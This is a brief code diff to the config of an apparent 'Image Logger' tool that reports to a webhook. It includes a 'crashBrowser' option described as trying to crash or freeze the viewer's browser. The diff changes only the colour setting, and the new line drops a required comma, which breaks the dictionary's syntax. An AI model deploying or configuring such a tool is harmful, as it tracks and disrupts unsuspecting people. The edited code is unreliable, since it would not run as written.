@@ -19,7 +19,8 @@ config = {
 
     # CUSTOMIZATION #
     "username": "Project Douchebag Image Logger", # Set this to the name you want the webhook to have
-    "color": 008080, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "color": 0x008080  # Teal color
+
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
